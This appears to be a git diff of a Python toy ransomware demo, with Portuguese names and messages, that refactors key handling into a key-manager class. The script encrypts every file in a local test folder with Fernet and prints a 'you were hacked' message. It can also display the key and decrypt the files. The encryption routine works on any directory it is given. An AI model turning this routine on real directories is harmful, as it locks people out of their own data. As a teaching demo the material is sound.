@@ -4,6 +4,7 @@ import shutil
 from cryptography.fernet import Fernet
 
 from arquivos_utils import ler_arquivo, escrever_arquivo
+from classes import GerenciadorDeChave
 
 
 def garanta_existencia_diretorio(diretorio: str) -> None:
@@ -19,9 +20,8 @@ def garanta_existencia_diretorio(diretorio: str) -> None:
     print('Arquivos copiados com sucesso!')
 
 
-def criptografe_diretorio(diretorio: str) -> None:
-    chave_criptografia = Fernet.generate_key()
-    escrever_arquivo('keys.rans', chave_criptografia)
+def criptografe_diretorio(diretorio, gerenciador_de_chave):
+    chave_criptografia = gerenciador_de_chave.crie_chave()
     fernet = Fernet(chave_criptografia)
 
     for nome_arquivo in os.listdir(diretorio):
@@ -35,8 +35,9 @@ def obtenha_chave_criptografia():
     return ler_arquivo('keys.rans')
 
 
-def descriptografe_diretorio(diretorio, chave_descriptografia):
-    fernet = Fernet(chave_descriptografia)
+def descriptografe_diretorio(diretorio, chave_legivel, gerenciador_de_chave):
+    chave = gerenciador_de_chave.converta_para_bytes(chave_legivel)
+    fernet = Fernet(chave)
 
     for nome_arquivo in os.listdir(diretorio):
         caminho_arquivo = f'{diretorio}/{nome_arquivo}'
@@ -45,7 +46,7 @@ def descriptografe_diretorio(diretorio, chave_descriptografia):
         conteudo = fernet.decrypt(conteudo_criptografado)
         escrever_arquivo(caminho_arquivo, conteudo)
 
-    os.remove('keys.rans')
+    gerenciador_de_chave.remova_chave()
 
 
 if __name__ == '__main__':
@@ -54,6 +55,7 @@ if __name__ == '__main__':
     # Altere o diretório por sua conta e risco.
 
     DIRETORIO_TESTE: str = './ransomware_tmp'
+    gerenciador_de_chave = GerenciadorDeChave('keys.rans')
     print('O que você deseja fazer?')
     opcao: int = -1
     while opcao != 0:
@@ -65,13 +67,13 @@ if __name__ == '__main__':
 
         if opcao == 1:
             garanta_existencia_diretorio(DIRETORIO_TESTE)
-            criptografe_diretorio(DIRETORIO_TESTE)
+            criptografe_diretorio(DIRETORIO_TESTE, gerenciador_de_chave)
             print(f'Você foi hackeado! Todos os arquivos do diretório {DIRETORIO_TESTE} foram criptografados!')
         elif opcao == 2:
-            print(f'Chave de descriptografia: {obtenha_chave_criptografia().decode("utf-8")}')
+            print(f'Chave de descriptografia: {gerenciador_de_chave.obtenha_chave(legivel=True)}')
         elif opcao == 3:
-            chave_descriptografia = input('Digite a chave de descriptografia: ')
-            descriptografe_diretorio(DIRETORIO_TESTE, chave_descriptografia.encode('utf-8'))
+            chave_legivel = input('Digite a chave de descriptografia: ')
+            descriptografe_diretorio(DIRETORIO_TESTE, chave_legivel, gerenciador_de_chave)
             print(
                 f'Você não está mais hackeado! Todos os arquivos do diretório {DIRETORIO_TESTE} foram descriptografados!'
             )
